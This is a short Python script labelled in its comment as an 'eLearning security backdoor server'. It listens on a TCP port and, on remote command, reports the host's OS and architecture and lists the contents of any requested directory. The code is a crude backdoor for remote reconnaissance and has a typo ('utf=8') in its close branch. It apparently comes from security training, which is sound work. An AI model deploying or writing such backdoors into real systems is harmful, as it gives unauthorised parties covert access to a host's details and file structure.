#!/usr/bin/env python3

#eLearning security backdoor server

import socket, platform, os

def main():
    ip = os.sys.argv[1]
    port = int(os.sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(1)
    
    conn, addr = s.accept()

    while(1):
        try:
            data = conn.recv(1024)
        except: continue

        if(data.decode("utf-8") == '1'):
            tosend = platform.platform() + " " + platform.machine()
            conn.sendall(tosend.encode())
        elif(data.decode('utf-8') == '2'):
            data = conn.recv(1024)
            try:
                fl = os.listdir(data.decode('utf-8'))
                tosend = ''
                for x in fl:
                    tosend += ',' + x

            except:
                tosend = "Wrong path!\n"
            conn.sendall(tosend.encode())
        elif(data.decode('utf=8') == '0'):
            conn.close()
            #conn, addr = s.accept()


if __name__ == '__main__':
    main()
